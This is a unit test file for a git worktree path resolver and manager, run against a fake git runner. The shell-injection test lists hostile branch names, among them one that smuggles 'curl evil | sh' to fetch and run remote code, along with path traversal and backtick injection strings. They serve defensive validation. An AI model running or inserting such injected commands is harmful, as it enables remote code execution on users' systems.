import { test, expect, describe, beforeEach } from "bun:test";
import { resolve } from "path";
import {
  ensureWorktree,
  removeWorktree,
  resolveWorktreePath,
  WORKTREE_SUBDIR,
  type GitGhRunner,
} from "../../src/session/worktree";

/**
 * Unit tests for the per-branch worktree logic (Issue #154). A fake
 * {@link GitGhRunner} stands in for git/gh so these tests exercise the Q1/Q2/Q4
 * branching without touching a real repo. The journey AC (issue body) maps to:
 *   - AC-1 (unknown branch → worktree from default): "creates a new branch ..."
 *   - AC-3 (existing worktree → reuse):              "reuses ..."
 *   - AC-4 (empty branch → error):                   "rejects ..."
 */

class FakeRunner implements GitGhRunner {
  existing = new Set<string>(); // worktree paths that already exist (Q4)
  branches = new Set<string>(); // refs that resolve (Q1)
  defaultBranchName = "main";
  calls: string[] = [];

  branchExists(_dir: string, branch: string): boolean {
    this.calls.push(`branchExists:${branch}`);
    return this.branches.has(branch);
  }
  defaultBranch(_dir: string): string {
    this.calls.push(`defaultBranch`);
    return this.defaultBranchName;
  }
  addWorktreeFromBranch(_dir: string, path: string, branch: string): void {
    this.calls.push(`addFromBranch:${branch}`);
    this.existing.add(path);
  }
  addWorktreeNewBranch(
    _dir: string,
    path: string,
    branch: string,
    base: string,
  ): void {
    this.calls.push(`addNewBranch:${branch}:${base}`);
    this.existing.add(path);
  }
  removeWorktree(_dir: string, path: string): void {
    this.calls.push(`remove:${path}`);
    this.existing.delete(path);
  }
  pathExists(path: string): boolean {
    return this.existing.has(path);
  }
}

const REPO = "/Users/x/agent-base";

describe("resolveWorktreePath", () => {
  test("maps a simple branch to <repo>/.claude/worktrees/<branch>", () => {
    expect(resolveWorktreePath(REPO, "feature-foo")).toBe(
      resolve(REPO, WORKTREE_SUBDIR, "feature-foo"),
    );
  });

  test("allows slash branch names as nested dirs", () => {
    expect(resolveWorktreePath(REPO, "feat/foo")).toBe(
      resolve(REPO, WORKTREE_SUBDIR, "feat/foo"),
    );
  });

  test("rejects path traversal that escapes the worktrees root", () => {
    expect(() => resolveWorktreePath(REPO, "../../../tmp/evil")).toThrow(
      /path traversal/,
    );
  });

  test("rejects empty / dot branch that resolves to the root itself", () => {
    expect(() => resolveWorktreePath(REPO, ".")).toThrow(/不正/);
  });

  test("rejects shell-injection chars that would break out of cd \"<path>\"", () => {
    // Each of these is dangerous inside the downstream `cd "<path>"` string.
    for (const bad of [
      'foo"; curl evil | sh; echo "',
      "foo`id`",
      "foo$HOME",
      "foo\\bar",
      "foo\nbar",
    ]) {
      expect(() => resolveWorktreePath(REPO, bad)).toThrow(/使用できない文字/);
    }
  });

  test("allows ordinary ref punctuation (dash, dot, slash, underscore)", () => {
    expect(() => resolveWorktreePath(REPO, "feat/foo-bar.v2_x")).not.toThrow();
  });
});

describe("ensureWorktree", () => {
  let runner: FakeRunner;
  beforeEach(() => {
    runner = new FakeRunner();
  });

  test("AC-1: unknown branch → creates worktree from default branch", () => {
    runner.defaultBranchName = "main";
    const result = ensureWorktree(REPO, "feature-foo", runner);

    expect(result.reused).toBe(false);
    expect(result.baseBranch).toBe("main");
    expect(result.path).toBe(resolve(REPO, WORKTREE_SUBDIR, "feature-foo"));
    expect(runner.calls).toContain("addNewBranch:feature-foo:main");
  });

  test("Q1: existing branch → checkout into worktree (no new branch)", () => {
    runner.branches.add("existing-branch");
    const result = ensureWorktree(REPO, "existing-branch", runner);

    expect(result.reused).toBe(false);
    expect(result.baseBranch).toBeUndefined();
    expect(runner.calls).toContain("addFromBranch:existing-branch");
    expect(runner.calls.some((c) => c.startsWith("addNewBranch"))).toBe(false);
  });

  test("AC-3 / Q4: existing worktree → reuse, no git add", () => {
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path);

    const result = ensureWorktree(REPO, "feature-foo", runner);

    expect(result.reused).toBe(true);
    expect(result.path).toBe(path);
    expect(runner.calls.some((c) => c.startsWith("add"))).toBe(false);
  });

  test("is idempotent: second ensure of the same branch reuses", () => {
    ensureWorktree(REPO, "feature-foo", runner); // creates
    const second = ensureWorktree(REPO, "feature-foo", runner);
    expect(second.reused).toBe(true);
  });

  test("uses dynamic default branch (Q2: master/develop mixed repos)", () => {
    runner.defaultBranchName = "develop";
    const result = ensureWorktree(REPO, "new-feat", runner);
    expect(result.baseBranch).toBe("develop");
    expect(runner.calls).toContain("addNewBranch:new-feat:develop");
  });

  test("AC-4: empty / whitespace branch throws", () => {
    expect(() => ensureWorktree(REPO, "", runner)).toThrow(/必須/);
    expect(() => ensureWorktree(REPO, "   ", runner)).toThrow(/必須/);
  });

  test("trims surrounding whitespace from branch name", () => {
    const result = ensureWorktree(REPO, "  feature-foo  ", runner);
    expect(result.path).toBe(resolve(REPO, WORKTREE_SUBDIR, "feature-foo"));
  });
});

describe("removeWorktree", () => {
  test("delegates to the runner (Q3)", () => {
    const runner = new FakeRunner();
    const path = resolveWorktreePath(REPO, "feature-foo");
    runner.existing.add(path);

    removeWorktree(REPO, path, runner);

    expect(runner.calls).toContain(`remove:${path}`);
    expect(runner.pathExists(path)).toBe(false);
  });
});
